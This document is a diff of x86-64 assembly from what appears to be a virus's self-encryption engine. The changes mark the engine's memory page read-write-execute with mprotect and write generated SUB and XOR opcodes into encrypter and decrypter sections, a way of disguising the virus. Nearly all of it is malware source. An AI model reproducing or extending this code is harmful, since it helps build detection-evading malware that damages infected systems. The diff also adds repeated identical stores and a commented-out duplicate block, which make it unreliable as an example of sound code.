@@ -34,28 +34,49 @@ mov [rbp-0x20], rsi ; offset of encrypt section
 mov [rbp-0x18],	rdx ; size of virus in hexa
 mov [rbp-0x10],	rcx ; offset of decrypter section
 
+; protect rdi from corruptio
+mov r15, rdi
+
 ; call decrypt engine
 add rdi, rsi
 mov rsi, rdx
 call work_engine
 
-; do stuff here
+; ; do stuff here
+; call getpagesize
+; ; rax has 0x1000
+; mov rcx, rax
+; ; save rax for later use when passing to mprotect
+; sub	rcx, 0x1
+; not rcx
+; mov	rdi, .encryption_function
+; and rdi, rcx
+; ; AND them and the result will be stored in rcx
+; ; rdi must hold the page_start address
+; mov rsi, rax
+; ; rsi must have the page length
+; mov rdx, 0x7
+; ; read+write+exec = 0x7
+; call mprotect
+
 call getpagesize
 ; rax has 0x1000
 mov rcx, rax
 ; save rax for later use when passing to mprotect
-sub	rcx, 0x1
+sub rcx, 0x1
 not rcx
-mov	rdi, .encryption_function
+mov rdi, .encryption_function
 and rdi, rcx
 ; AND them and the result will be stored in rcx
 ; rdi must hold the page_start address
-mov rsi, rax
-; rsi must have the page length
+; mov rsi, %2      ;rsi = end
+mov r12, rdi
+mov r13, rsi 
+mov rsi, 0xb40      ;rsi = end
+
 mov rdx, 0x7
 ; read+write+exec = 0x7
 call mprotect
-
 
 
 ; set up needed values
@@ -64,6 +85,9 @@ mov rbx, .encryption_function
 add rbx, FUNC_SIZE
 sub rbx, 0x1
 ; must use rbx here because rbx is the only one that will not change on rand call later
+xor r13, r13
+mov r13, r15
+; empty this space so ensure no corruption
 mov r13, [rbp-0x28]
 add r13, [rbp-0x10] 
 add r13, FUNC_SIZE
@@ -108,6 +132,12 @@ add r13, FUNC_SIZE
 	mov cl, OPCODE_SUB_REG
 	xchg al, ah
 	mov [r12], ax
+	mov [r12], ax
+	mov [r12], ax
+	mov [r12], ax
+	mov [r13], cx
+	mov [r13], cx
+	mov [r13], cx
 	mov [r13], cx
 	add r12, 0x2
 	jmp .encrypt_logic_loop
@@ -139,6 +169,12 @@ add r13, FUNC_SIZE
 	mov cl, OPCODE_XOR
 	xchg al, ah
 	mov [r12], ax
+	mov [r12], ax
+	mov [r12], ax
+	mov [r12], ax
+	mov [r13], cx
+	mov [r13], cx
+	mov [r13], cx
 	mov [r13], cx
 	add r12, 0x2
 	jmp .encrypt_logic_loop	
